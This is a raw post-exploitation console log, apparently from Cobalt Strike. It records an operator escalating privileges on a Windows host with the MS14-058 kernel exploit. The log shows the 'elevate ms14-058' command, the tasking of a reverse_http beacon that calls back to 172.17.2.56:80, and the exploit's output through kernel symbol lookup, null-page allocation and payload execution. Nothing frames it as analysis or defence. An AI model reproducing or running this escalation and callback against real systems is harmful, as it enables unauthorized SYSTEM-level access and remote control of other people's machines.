02/23 11:29:38 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 13480; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/23 11:29:45 [input] <neo> elevate ms14-058 test
02/23 11:29:46 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/23 11:30:35 [checkin] host called home, sent: 104503 bytes
02/23 11:30:36 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43816
[*] Parsing SYSTEM_INFO...
[*] 148 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c51000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003FA41FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FA79D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C286E010
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


